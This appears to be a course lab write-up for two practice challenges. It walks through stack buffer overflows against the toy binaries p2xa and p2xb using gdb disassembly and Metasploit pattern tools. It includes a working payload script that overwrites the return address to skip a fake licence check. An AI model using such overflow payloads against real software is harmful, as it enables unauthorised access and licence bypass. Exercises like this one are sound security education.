#### Proj 2x: Linux Buffer Overflow Without Shellcode Challenges

###### Challenge 1: Product Activation

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ curl https://samsclass.info/127/proj/p2xa.c > p2xa.c
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   584  100   584    0     0   2022      0 --:--:-- --:--:-- --:--:--  2027
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ curl https://samsclass.info/127/proj/p2xa > p2xa
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  6544  100  6544    0     0  33071      0 --:--:-- --:--:-- --:--:-- 33050
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ ls -l
total 12
-rw-rw-r-- 1 u32 u32 6544 Sep  1 10:57 p2xa
-rw-rw-r-- 1 u32 u32  584 Sep  1 10:57 p2xa.c
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ chmod +x p2xa
```

```c
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ cat p2xa.c
#include <stdio.h>

int activate()
{
        char pin[50];
        int x=15, i;
        printf("Enter your 25-digit license key: ");
        gets(pin);
        for (i=0; i<25; i+=2) x = (x & pin[i]) | pin[i+1];
        if (x == 0) return 0;
        else return 1;
}

void main()
{
	printf("You must purchase a license key to use this software.\n");
        if (activate()) {
	 printf("Warning!\n");
	 printf("You may be the victim of software piracy!\n");
	 printf("You may not realize the many benifits of using genuine software!\n");
	}
        else printf("A WINNER IS YOU!\n");
}
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ gcc -g -fno-stack-protector -z execstack -o p2xa p2xa.c
p2xa.c: In function ‘activate’:
p2xa.c:8:9: warning: implicit declaration of function ‘gets’ [-Wimplicit-function-declaration]
         gets(pin);
         ^~~~
/tmp/cc5McunT.o: In function `activate':
/home/u32/cnit127/chapter-2/Proj-2x/p2xa.c:8: warning: the `gets' function is dangerous and should not be used.
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ ./p2xa
You must purchase a license key to use this software.
Enter your 25-digit license key: AAAAAAAAAABBBBBBBBBBCCCCCCCCCC
Warning!
You may be the victim of software piracy!
You may not realize the many benifits of using genuine software!
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ gdb ./p2xa -q
Reading symbols from ./p2xa...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484e4 <+0>:	lea    ecx,[esp+0x4]
   0x080484e8 <+4>:	and    esp,0xfffffff0
   0x080484eb <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484ee <+10>:	push   ebp
   0x080484ef <+11>:	mov    ebp,esp
   0x080484f1 <+13>:	push   ecx
   0x080484f2 <+14>:	sub    esp,0x4
   0x080484f5 <+17>:	sub    esp,0xc
   0x080484f8 <+20>:	push   0x8048604
   0x080484fd <+25>:	call   0x8048340 <puts@plt>
   0x08048502 <+30>:	add    esp,0x10
   0x08048505 <+33>:	call   0x804846b <activate>
   0x0804850a <+38>:	test   eax,eax
   0x0804850c <+40>:	je     0x8048540 <main+92>
   0x0804850e <+42>:	sub    esp,0xc
   0x08048511 <+45>:	push   0x804863a
   0x08048516 <+50>:	call   0x8048340 <puts@plt>
   0x0804851b <+55>:	add    esp,0x10
   0x0804851e <+58>:	sub    esp,0xc
   0x08048521 <+61>:	push   0x8048644
   0x08048526 <+66>:	call   0x8048340 <puts@plt>
   0x0804852b <+71>:	add    esp,0x10
   0x0804852e <+74>:	sub    esp,0xc
   0x08048531 <+77>:	push   0x8048670
   0x08048536 <+82>:	call   0x8048340 <puts@plt>
   0x0804853b <+87>:	add    esp,0x10
   0x0804853e <+90>:	jmp    0x8048550 <main+108>
   0x08048540 <+92>:	sub    esp,0xc
   0x08048543 <+95>:	push   0x80486b1
   0x08048548 <+100>:	call   0x8048340 <puts@plt>
   0x0804854d <+105>:	add    esp,0x10
   0x08048550 <+108>:	nop
   0x08048551 <+109>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048554 <+112>:	leave
   0x08048555 <+113>:	lea    esp,[ecx-0x4]
   0x08048558 <+116>:	ret
End of assembler dump.
(gdb) disassemble activate
Dump of assembler code for function activate:
   0x0804846b <+0>:	push   ebp
   0x0804846c <+1>:	mov    ebp,esp
   0x0804846e <+3>:	sub    esp,0x48
   0x08048471 <+6>:	mov    DWORD PTR [ebp-0xc],0xf
   0x08048478 <+13>:	sub    esp,0xc
   0x0804847b <+16>:	push   0x80485e0
   0x08048480 <+21>:	call   0x8048320 <printf@plt>
   0x08048485 <+26>:	add    esp,0x10
   0x08048488 <+29>:	sub    esp,0xc
   0x0804848b <+32>:	lea    eax,[ebp-0x42]
   0x0804848e <+35>:	push   eax
   0x0804848f <+36>:	call   0x8048330 <gets@plt>
   0x08048494 <+41>:	add    esp,0x10
   0x08048497 <+44>:	mov    DWORD PTR [ebp-0x10],0x0
   0x0804849e <+51>:	jmp    0x80484ca <activate+95>
   0x080484a0 <+53>:	lea    edx,[ebp-0x42]
   0x080484a3 <+56>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080484a6 <+59>:	add    eax,edx
   0x080484a8 <+61>:	movzx  eax,BYTE PTR [eax]
   0x080484ab <+64>:	movsx  eax,al
   0x080484ae <+67>:	and    eax,DWORD PTR [ebp-0xc]
   0x080484b1 <+70>:	mov    edx,eax
   0x080484b3 <+72>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080484b6 <+75>:	add    eax,0x1
   0x080484b9 <+78>:	movzx  eax,BYTE PTR [ebp+eax*1-0x42]
   0x080484be <+83>:	movsx  eax,al
   0x080484c1 <+86>:	or     eax,edx
   0x080484c3 <+88>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484c6 <+91>:	add    DWORD PTR [ebp-0x10],0x2
   0x080484ca <+95>:	cmp    DWORD PTR [ebp-0x10],0x18
   0x080484ce <+99>:	jle    0x80484a0 <activate+53>
   0x080484d0 <+101>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080484d4 <+105>:	jne    0x80484dd <activate+114>
   0x080484d6 <+107>:	mov    eax,0x0
   0x080484db <+112>:	jmp    0x80484e2 <activate+119>
   0x080484dd <+114>:	mov    eax,0x1
   0x080484e2 <+119>:	leave
   0x080484e3 <+120>:	ret
End of assembler dump.
(gdb) break *0x0804848f
Breakpoint 1 at 0x804848f: file p2xa.c, line 8.
(gdb) break *0x080484e2
Breakpoint 2 at 0x80484e2: file p2xa.c, line 12.
(gdb) run
Starting program: /home/u32/cnit127/chapter-2/Proj-2x/p2xa
You must purchase a license key to use this software.

Breakpoint 1, 0x0804848f in activate () at p2xa.c:8
8	        gets(pin);
(gdb) x/20x $ebp
0xbffff5a8:	0xbffff5b8	0x0804850a	0xb7fb83dc	0xbffff5d0
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000001	0xb7fb8000
0xbffff5c8:	0x00000000	0xb7e1a276	0x00000001	0xbffff664
0xbffff5d8:	0xbffff66c	0x00000000	0x00000000	0x00000000
0xbffff5e8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.
Enter your 25-digit license key: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 2, activate () at p2xa.c:12
12	}
(gdb) x/20x $ebp
0xbffff5a8:	0x41326341	0x63413363	0x35634134	0x41366341
0xbffff5b8:	0x63413763	0x39634138	0x41306441	0x64413164
0xbffff5c8:	0x00004132	0xb7e1a276	0x00000001	0xbffff664
0xbffff5d8:	0xbffff66c	0x00000000	0x00000000	0x00000000
0xbffff5e8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) quit
A debugging session is active.

	Inferior 1 [process 6077] will be killed.

Quit anyway? (y or n) y
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
root@kali:/usr/share/metasploit-framework/tools/exploit#
```

```sh
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 63413363
[*] Exact match at offset 70
root@kali:/usr/share/metasploit-framework/tools/exploit#
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ gdb ./p2xa -q
Reading symbols from ./p2xa...done.
(gdb) disassemble activate
Dump of assembler code for function activate:
   0x0804846b <+0>:	push   ebp
   0x0804846c <+1>:	mov    ebp,esp
   0x0804846e <+3>:	sub    esp,0x48
   0x08048471 <+6>:	mov    DWORD PTR [ebp-0xc],0xf
   0x08048478 <+13>:	sub    esp,0xc
   0x0804847b <+16>:	push   0x80485e0
   0x08048480 <+21>:	call   0x8048320 <printf@plt>
   0x08048485 <+26>:	add    esp,0x10
   0x08048488 <+29>:	sub    esp,0xc
   0x0804848b <+32>:	lea    eax,[ebp-0x42]
   0x0804848e <+35>:	push   eax
   0x0804848f <+36>:	call   0x8048330 <gets@plt>
   0x08048494 <+41>:	add    esp,0x10
   0x08048497 <+44>:	mov    DWORD PTR [ebp-0x10],0x0
   0x0804849e <+51>:	jmp    0x80484ca <activate+95>
   0x080484a0 <+53>:	lea    edx,[ebp-0x42]
   0x080484a3 <+56>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080484a6 <+59>:	add    eax,edx
   0x080484a8 <+61>:	movzx  eax,BYTE PTR [eax]
   0x080484ab <+64>:	movsx  eax,al
   0x080484ae <+67>:	and    eax,DWORD PTR [ebp-0xc]
   0x080484b1 <+70>:	mov    edx,eax
   0x080484b3 <+72>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080484b6 <+75>:	add    eax,0x1
   0x080484b9 <+78>:	movzx  eax,BYTE PTR [ebp+eax*1-0x42]
   0x080484be <+83>:	movsx  eax,al
   0x080484c1 <+86>:	or     eax,edx
   0x080484c3 <+88>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484c6 <+91>:	add    DWORD PTR [ebp-0x10],0x2
   0x080484ca <+95>:	cmp    DWORD PTR [ebp-0x10],0x18
   0x080484ce <+99>:	jle    0x80484a0 <activate+53>
   0x080484d0 <+101>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080484d4 <+105>:	jne    0x80484dd <activate+114>
   0x080484d6 <+107>:	mov    eax,0x0
   0x080484db <+112>:	jmp    0x80484e2 <activate+119>
   0x080484dd <+114>:	mov    eax,0x1
   0x080484e2 <+119>:	leave
   0x080484e3 <+120>:	ret
End of assembler dump.
(gdb) break *0x0804848f
Breakpoint 1 at 0x804848f: file p2xa.c, line 8.
(gdb) break *0x080484e2
Breakpoint 2 at 0x80484e2: file p2xa.c, line 12.
(gdb) run
Starting program: /home/u32/cnit127/chapter-2/Proj-2x/p2xa
You must purchase a license key to use this software.

Breakpoint 1, 0x0804848f in activate () at p2xa.c:8
8	        gets(pin);
(gdb) x/20x $ebp
0xbffff5a8:	0xbffff5b8	0x0804850a	0xb7fb83dc	0xbffff5d0
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000001	0xb7fb8000
0xbffff5c8:	0x00000000	0xb7e1a276	0x00000001	0xbffff664
0xbffff5d8:	0xbffff66c	0x00000000	0x00000000	0x00000000
0xbffff5e8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.
Enter your 25-digit license key: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Breakpoint 2, activate () at p2xa.c:12
12	}
(gdb) x/20x $ebp
0xbffff5a8:	0x41414141	0x42424242	0xb7fb8300	0xbffff5d0
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000001	0xb7fb8000
0xbffff5c8:	0x00000000	0xb7e1a276	0x00000001	0xbffff664
0xbffff5d8:	0xbffff66c	0x00000000	0x00000000	0x00000000
0xbffff5e8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) quit
A debugging session is active.

	Inferior 1 [process 6083] will be killed.

Quit anyway? (y or n) y
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ gdb ./p2xa -q
Reading symbols from ./p2xa...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484e4 <+0>:	lea    ecx,[esp+0x4]
   0x080484e8 <+4>:	and    esp,0xfffffff0
   0x080484eb <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484ee <+10>:	push   ebp
   0x080484ef <+11>:	mov    ebp,esp
   0x080484f1 <+13>:	push   ecx
   0x080484f2 <+14>:	sub    esp,0x4
   0x080484f5 <+17>:	sub    esp,0xc
   0x080484f8 <+20>:	push   0x8048604
   0x080484fd <+25>:	call   0x8048340 <puts@plt>
   0x08048502 <+30>:	add    esp,0x10
   0x08048505 <+33>:	call   0x804846b <activate>
   0x0804850a <+38>:	test   eax,eax
   0x0804850c <+40>:	je     0x8048540 <main+92>
   0x0804850e <+42>:	sub    esp,0xc
   0x08048511 <+45>:	push   0x804863a
   0x08048516 <+50>:	call   0x8048340 <puts@plt>
   0x0804851b <+55>:	add    esp,0x10
   0x0804851e <+58>:	sub    esp,0xc
   0x08048521 <+61>:	push   0x8048644
   0x08048526 <+66>:	call   0x8048340 <puts@plt>
   0x0804852b <+71>:	add    esp,0x10
   0x0804852e <+74>:	sub    esp,0xc
   0x08048531 <+77>:	push   0x8048670
   0x08048536 <+82>:	call   0x8048340 <puts@plt>
   0x0804853b <+87>:	add    esp,0x10
   0x0804853e <+90>:	jmp    0x8048550 <main+108>
   0x08048540 <+92>:	sub    esp,0xc
   0x08048543 <+95>:	push   0x80486b1
   0x08048548 <+100>:	call   0x8048340 <puts@plt>
   0x0804854d <+105>:	add    esp,0x10
   0x08048550 <+108>:	nop
   0x08048551 <+109>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048554 <+112>:	leave
   0x08048555 <+113>:	lea    esp,[ecx-0x4]
   0x08048558 <+116>:	ret
End of assembler dump.
(gdb) x/s 0x80486b1
0x80486b1:	"A WINNER IS YOU!"
(gdb) quit
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
   0x08048540 <+92>:	sub    esp,0xc
   0x08048543 <+95>:	push   0x80486b1
   0x08048548 <+100>:	call   0x8048340 <puts@plt>
```

```sh
>>> "A"*70
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>>
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ cat p2xa-e.py
#!/usr/bin/python

import sys
sys.stdout.write("AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x40\x85\x04\x08")
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ chmod +x p2xa-e.py
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ ./p2xa-e.py > p2xa-exploit
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ xxd -g 1 p2xa-exploit
00000000: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000010: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000020: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000030: 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
00000040: 41 41 41 41 41 41 40 85 04 08                    AAAAAA@...
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ gdb ./p2xa -q
Reading symbols from ./p2xa...done.
(gdb) disassemble activate
Dump of assembler code for function activate:
   0x0804846b <+0>:	push   ebp
   0x0804846c <+1>:	mov    ebp,esp
   0x0804846e <+3>:	sub    esp,0x48
   0x08048471 <+6>:	mov    DWORD PTR [ebp-0xc],0xf
   0x08048478 <+13>:	sub    esp,0xc
   0x0804847b <+16>:	push   0x80485e0
   0x08048480 <+21>:	call   0x8048320 <printf@plt>
   0x08048485 <+26>:	add    esp,0x10
   0x08048488 <+29>:	sub    esp,0xc
   0x0804848b <+32>:	lea    eax,[ebp-0x42]
   0x0804848e <+35>:	push   eax
   0x0804848f <+36>:	call   0x8048330 <gets@plt>
   0x08048494 <+41>:	add    esp,0x10
   0x08048497 <+44>:	mov    DWORD PTR [ebp-0x10],0x0
   0x0804849e <+51>:	jmp    0x80484ca <activate+95>
   0x080484a0 <+53>:	lea    edx,[ebp-0x42]
   0x080484a3 <+56>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080484a6 <+59>:	add    eax,edx
   0x080484a8 <+61>:	movzx  eax,BYTE PTR [eax]
   0x080484ab <+64>:	movsx  eax,al
   0x080484ae <+67>:	and    eax,DWORD PTR [ebp-0xc]
   0x080484b1 <+70>:	mov    edx,eax
   0x080484b3 <+72>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080484b6 <+75>:	add    eax,0x1
   0x080484b9 <+78>:	movzx  eax,BYTE PTR [ebp+eax*1-0x42]
   0x080484be <+83>:	movsx  eax,al
   0x080484c1 <+86>:	or     eax,edx
   0x080484c3 <+88>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484c6 <+91>:	add    DWORD PTR [ebp-0x10],0x2
   0x080484ca <+95>:	cmp    DWORD PTR [ebp-0x10],0x18
   0x080484ce <+99>:	jle    0x80484a0 <activate+53>
   0x080484d0 <+101>:	cmp    DWORD PTR [ebp-0xc],0x0
   0x080484d4 <+105>:	jne    0x80484dd <activate+114>
   0x080484d6 <+107>:	mov    eax,0x0
   0x080484db <+112>:	jmp    0x80484e2 <activate+119>
   0x080484dd <+114>:	mov    eax,0x1
   0x080484e2 <+119>:	leave
   0x080484e3 <+120>:	ret
End of assembler dump.
(gdb) break *0x0804848f
Breakpoint 1 at 0x804848f: file p2xa.c, line 8.
(gdb) break *0x080484e2
Breakpoint 2 at 0x80484e2: file p2xa.c, line 12.
(gdb) run --args < p2xa-exploit
Starting program: /home/u32/cnit127/chapter-2/Proj-2x/p2xa --args < p2xa-exploit
You must purchase a license key to use this software.

Breakpoint 1, 0x0804848f in activate () at p2xa.c:8
8	        gets(pin);
(gdb) x/20x $ebp
0xbffff598:	0xbffff5a8	0x0804850a	0xb7fb83dc	0xbffff5c0
0xbffff5a8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000002	0xbffff654
0xbffff5c8:	0xbffff660	0x00000000	0x00000000	0x00000000
0xbffff5d8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.

Breakpoint 2, activate () at p2xa.c:12
12	}
(gdb) x/20x $ebp
0xbffff598:	0x41414141	0x08048540	0xb7fb8300	0xbffff5c0
0xbffff5a8:	0x00000000	0xb7e1a276	0x00000002	0xb7fb8000
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000002	0xbffff654
0xbffff5c8:	0xbffff660	0x00000000	0x00000000	0x00000000
0xbffff5d8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.
Enter your 25-digit license key: A WINNER IS YOU!

Program received signal SIGSEGV, Segmentation fault.
0x08048551 in main () at p2xa.c:23
23	}
(gdb) quit
A debugging session is active.

	Inferior 1 [process 6107] will be killed.

Quit anyway? (y or n) y
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ ./p2xa < p2xa-exploit
You must purchase a license key to use this software.
Enter your 25-digit license key: A WINNER IS YOU!
Segmentation fault (core dumped)
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

###### Challenge 2: CISSP ID (15 pts.)

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ wget https://samsclass.info/127/proj/p2xb
--2017-09-01 12:47:56--  https://samsclass.info/127/proj/p2xb
Resolving samsclass.info (samsclass.info)... 104.28.17.29, 104.28.16.29
Connecting to samsclass.info (samsclass.info)|104.28.17.29|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5556 (5.4K) [application/x-executable]
Saving to: ‘p2xb’

p2xb                                               100%[================================================================================================================>]   5.43K  --.-KB/s    in 0s

2017-09-01 12:47:57 (26.3 MB/s) - ‘p2xb’ saved [5556/5556]

u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ chmod +x p2xb
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ ./p2xb
Only CISSPs are authorized to use this dangerous exploit.
Enter your (ISC)^2 CISSP ID Number: bsdfj
Invalid CISSP ID Number!
You must be an evil script kiddie.
BEGONE, THOU DOER OF EVIL!
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ gdb ./p2xb -q
Reading symbols from ./p2xb...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484d7 <+0>:	lea    ecx,[esp+0x4]
   0x080484db <+4>:	and    esp,0xfffffff0
   0x080484de <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484e1 <+10>:	push   ebp
   0x080484e2 <+11>:	mov    ebp,esp
   0x080484e4 <+13>:	push   ecx
   0x080484e5 <+14>:	sub    esp,0x4
   0x080484e8 <+17>:	sub    esp,0xc
   0x080484eb <+20>:	push   0x8048608
   0x080484f0 <+25>:	call   0x8048330 <puts@plt>
   0x080484f5 <+30>:	add    esp,0x10
   0x080484f8 <+33>:	call   0x804845b <auth>
   0x080484fd <+38>:	test   eax,eax
   0x080484ff <+40>:	je     0x8048533 <main+92>
   0x08048501 <+42>:	sub    esp,0xc
   0x08048504 <+45>:	push   0x8048642
   0x08048509 <+50>:	call   0x8048330 <puts@plt>
   0x0804850e <+55>:	add    esp,0x10
   0x08048511 <+58>:	sub    esp,0xc
   0x08048514 <+61>:	push   0x804865c
   0x08048519 <+66>:	call   0x8048330 <puts@plt>
   0x0804851e <+71>:	add    esp,0x10
   0x08048521 <+74>:	sub    esp,0xc
   0x08048524 <+77>:	push   0x804867f
   0x08048529 <+82>:	call   0x8048330 <puts@plt>
   0x0804852e <+87>:	add    esp,0x10
   0x08048531 <+90>:	jmp    0x8048543 <main+108>
   0x08048533 <+92>:	sub    esp,0xc
   0x08048536 <+95>:	push   0x804869c
   0x0804853b <+100>:	call   0x8048330 <puts@plt>
   0x08048540 <+105>:	add    esp,0x10
   0x08048543 <+108>:	mov    ecx,DWORD PTR [ebp-0x4]
   0x08048546 <+111>:	leave
   0x08048547 <+112>:	lea    esp,[ecx-0x4]
   0x0804854a <+115>:	ret
End of assembler dump.
(gdb) disassemble auth
Dump of assembler code for function auth:
   0x0804845b <+0>:	push   ebp
   0x0804845c <+1>:	mov    ebp,esp
   0x0804845e <+3>:	sub    esp,0x28
   0x08048461 <+6>:	mov    DWORD PTR [ebp-0xc],0xf
   0x08048468 <+13>:	sub    esp,0xc
   0x0804846b <+16>:	push   0x80485e0
   0x08048470 <+21>:	call   0x8048310 <printf@plt>
   0x08048475 <+26>:	add    esp,0x10
   0x08048478 <+29>:	sub    esp,0xc
   0x0804847b <+32>:	lea    eax,[ebp-0x22]
   0x0804847e <+35>:	push   eax
   0x0804847f <+36>:	call   0x8048320 <gets@plt>
   0x08048484 <+41>:	add    esp,0x10
   0x08048487 <+44>:	mov    DWORD PTR [ebp-0x10],0x0
   0x0804848e <+51>:	jmp    0x80484ba <auth+95>
   0x08048490 <+53>:	lea    edx,[ebp-0x22]
   0x08048493 <+56>:	mov    eax,DWORD PTR [ebp-0x10]
   0x08048496 <+59>:	add    eax,edx
   0x08048498 <+61>:	movzx  eax,BYTE PTR [eax]
   0x0804849b <+64>:	movsx  eax,al
   0x0804849e <+67>:	and    eax,DWORD PTR [ebp-0xc]
   0x080484a1 <+70>:	mov    edx,eax
   0x080484a3 <+72>:	mov    eax,DWORD PTR [ebp-0x10]
   0x080484a6 <+75>:	add    eax,0x1
   0x080484a9 <+78>:	movzx  eax,BYTE PTR [ebp+eax*1-0x22]
   0x080484ae <+83>:	movsx  eax,al
   0x080484b1 <+86>:	or     eax,edx
   0x080484b3 <+88>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484b6 <+91>:	add    DWORD PTR [ebp-0x10],0x2
   0x080484ba <+95>:	cmp    DWORD PTR [ebp-0x10],0x7
   0x080484be <+99>:	jle    0x8048490 <auth+53>
   0x080484c0 <+101>:	cmp    DWORD PTR [ebp-0xc],0x3e7
   0x080484c7 <+108>:	jne    0x80484d0 <auth+117>
   0x080484c9 <+110>:	mov    eax,0x0
   0x080484ce <+115>:	jmp    0x80484d5 <auth+122>
   0x080484d0 <+117>:	mov    eax,0x1
   0x080484d5 <+122>:	leave
   0x080484d6 <+123>:	ret
End of assembler dump.
(gdb) break *0x0804847f
Breakpoint 1 at 0x804847f
(gdb) break *0x080484d5
Breakpoint 2 at 0x80484d5
(gdb) run
Starting program: /home/u32/cnit127/chapter-2/Proj-2x/p2xb
Only CISSPs are authorized to use this dangerous exploit.

Breakpoint 1, 0x0804847f in auth ()
(gdb) x/20x $ebp
0xbffff5a8:	0xbffff5b8	0x080484fd	0xb7fb83dc	0xbffff5d0
0xbffff5b8:	0x00000000	0xb7e1a276	0x00000001	0xb7fb8000
0xbffff5c8:	0x00000000	0xb7e1a276	0x00000001	0xbffff664
0xbffff5d8:	0xbffff66c	0x00000000	0x00000000	0x00000000
0xbffff5e8:	0xb7fb8000	0xb7fffc04	0xb7fff000	0x00000000
(gdb) c
Continuing.
Enter your (ISC)^2 CISSP ID Number: Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Breakpoint 2, 0x080484d5 in auth ()
(gdb) x/20x $ebp
0xbffff5a8:	0x62413162	0x33624132	0x41346241	0x62413562
0xbffff5b8:	0x37624136	0x41386241	0x63413962	0x31634130
0xbffff5c8:	0x41326341	0x63413363	0x35634134	0x41366341
0xbffff5d8:	0x63413763	0x39634138	0x41306441	0x64413164
0xbffff5e8:	0xb7004132	0xb7fffc04	0xb7fff000	0x00000000
(gdb) quit
A debugging session is active.

	Inferior 1 [process 6002] will be killed.

Quit anyway? (y or n) y
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$
```

```sh
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_create.rb -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
root@kali:/usr/share/metasploit-framework/tools/exploit#
```

```sh
root@kali:/usr/share/metasploit-framework/tools/exploit# ./pattern_offset.rb -q 33624132
[*] Exact match at offset 38
root@kali:/usr/share/metasploit-framework/tools/exploit#
```

```sh
>>> "A"*38
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
>>>
```

```sh
u32@u32-VirtualBox:~/cnit127/chapter-2/Proj-2x$ gdb ./p2xb -q
Reading symbols from ./p2xb...(no debugging symbols found)...done.
(gdb) disassemble main
Dump of assembler code for function main:
   0x080484d7 <+0>:	lea    ecx,[esp+0x4]
   0x080484db <+4>:	and    esp,0xfffffff0
   0x080484de <+7>:	push   DWORD PTR [ecx-0x4]
   0x080484e1 <+10>:	push   ebp
   0x080484e2 <+11>:	mov    ebp,esp
   0x080484e4 <+13>:	push   ecx
   0x080484e5 <+14>:	sub    esp,0x4
   0x080484e8 <+17>:	sub    esp,0xc
   0x080484eb <+20>:	push   0x8048608
   0x080484f0 <+25>:	call   0x8048330 <puts@plt>
   0x080484f5 <+30>:	add    esp,0x10
   0x080484f8 <+33>:	call   0x804845b <auth>
   0x080484fd <+38>:	test   eax,eax
   0x080484ff <+40>:	je     0x8048533 <main+92>
   0x08048501 <+42>:	sub    esp,0xc
   0x08048504 <+45>:	push   0x8048642
   0x08048509 <+50>:	call   0x8048330 <puts@plt>
   0x0804850e <+55>:	add    esp,0x10
   0x08048511 <+58>:	sub    esp,0xc
